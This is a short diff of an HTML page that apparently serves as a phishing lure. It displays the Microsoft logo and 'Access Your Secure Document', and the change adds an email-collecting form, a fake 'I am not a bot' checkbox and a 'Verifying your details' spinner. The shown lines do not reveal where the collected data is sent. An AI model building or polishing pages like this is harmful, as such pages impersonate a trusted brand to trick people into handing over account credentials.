@@ -84,10 +84,12 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="Logo">
         <h2>Access Your Secure Document</h2>
         <p>Enter your email to continue</p>
-        <input type="email" id="emailInput" placeholder="Enter your email" required>
-         <button type="submit">Continue</button>
-        <p class="footer">By continuing, you agree to our terms and privacy policy.</p>
-    </div>
+         <form id="emailForm" method="GET">
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            <div class="error" id="errorMessage" style="display: none;">Please enter a valid email address.</div>
+            <label>
+                <input type="checkbox" id="humanCheck" required> I am not a bot
+            </label>
     <div class="loading-section" id="loadingSection">
         <div class="spinner"></div>
         <p>Verifying your details...</p>
